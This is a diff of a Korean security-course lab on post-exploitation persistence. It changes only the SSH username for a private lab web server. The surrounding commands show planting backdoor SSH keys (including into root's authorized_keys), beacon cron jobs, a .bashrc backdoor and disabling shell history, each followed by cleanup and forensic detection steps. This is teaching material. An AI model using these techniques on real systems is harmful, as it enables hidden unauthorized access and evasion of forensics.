@@ -149,7 +149,7 @@ sudo mkdir -p /root/.ssh
 sudo sh -c 'echo "ssh-ed25519 AAAA...공개키내용... backdoor" >> /root/.ssh/authorized_keys'
 
 # 이후 키 기반 인증으로 접속 (패스워드 불필요)
-ssh -i /tmp/backdoor_key user@10.20.30.80
+ssh -i /tmp/backdoor_key web@10.20.30.80
 ```
 
 **탐지 방법:**
@@ -388,23 +388,23 @@ ssh-keygen -t ed25519 -f /tmp/week12_key -N "" -q
 cat /tmp/week12_key.pub
 
 # 3. web 서버에 키 추가
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
   "mkdir -p ~/.ssh && chmod 700 ~/.ssh"
 
 # 공개키를 web 서버에 복사
 PUBKEY=$(cat /tmp/week12_key.pub)
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
   "echo '$PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
 
 # 4. 키 기반 인증으로 접속 테스트 (패스워드 불필요)
-ssh -i /tmp/week12_key -o StrictHostKeyChecking=no user@10.20.30.80 "echo '키 인증 성공! whoami:' && whoami"
+ssh -i /tmp/week12_key -o StrictHostKeyChecking=no web@10.20.30.80 "echo '키 인증 성공! whoami:' && whoami"
 
 # 예상 출력:
 # 키 인증 성공! whoami:
 # user
 
 # 5. 정리: 백도어 키 제거
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
   "sed -i '/week12/d' ~/.ssh/authorized_keys 2>/dev/null; echo '키 제거 완료'"
 rm -f /tmp/week12_key /tmp/week12_key.pub
 ```
@@ -413,7 +413,7 @@ rm -f /tmp/week12_key /tmp/week12_key.pub
 
 ```bash
 # 1. web 서버에 비콘 cron 등록 (매분 /tmp에 타임스탬프 기록)
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'REMOTE'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'
 # 현재 cron 확인
 echo "=== 설치 전 cron ==="
 crontab -l 2>/dev/null || echo "(cron 없음)"
@@ -429,7 +429,7 @@ REMOTE
 # 2. 1분 대기 후 비콘 동작 확인
 sleep 65
 
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
   "echo '=== 비콘 로그 ===' && cat /tmp/beacon.log 2>/dev/null || echo '아직 실행 안 됨'"
 
 # 예상 출력:
@@ -437,7 +437,7 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
 # Thu Mar 27 10:01:01 KST 2026
 
 # 3. 정리: cron 백도어 제거
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'CLEANUP'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'
 crontab -l 2>/dev/null | grep -v "beacon.log" | crontab -
 rm -f /tmp/beacon.log
 echo "=== 정리 후 cron ==="
@@ -450,7 +450,7 @@ CLEANUP
 
 ```bash
 # 1. .bashrc에 백도어 추가
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'REMOTE'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'
 # 백업 생성
 cp ~/.bashrc ~/.bashrc.backup
 
@@ -463,11 +463,11 @@ cat ~/.bashrc | tail -3
 REMOTE
 
 # 2. 새 SSH 세션으로 접속하면 백도어 동작
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
   "cat /tmp/login_beacon.log 2>/dev/null && echo '--- 비콘 동작 확인'"
 
 # 3. 정리
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'CLEANUP'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'
 cp ~/.bashrc.backup ~/.bashrc
 rm -f /tmp/login_beacon.log ~/.bashrc.backup
 echo ".bashrc 복원 완료"
@@ -478,7 +478,7 @@ CLEANUP
 
 ```bash
 # web 서버 접속
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'REMOTE'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'
 echo "===== 1. 히스토리 비활성화 ====="
 echo "현재 HISTFILE: ${HISTFILE:-~/.bash_history}"
 export HISTFILE=/dev/null
@@ -520,7 +520,7 @@ REMOTE
 
 ```bash
 # web 서버에서 포렌식 조사 수행
-sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'FORENSIC'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'FORENSIC'
 echo "=========================================="
 echo "  포렌식 타임라인 재구성"
 echo "=========================================="
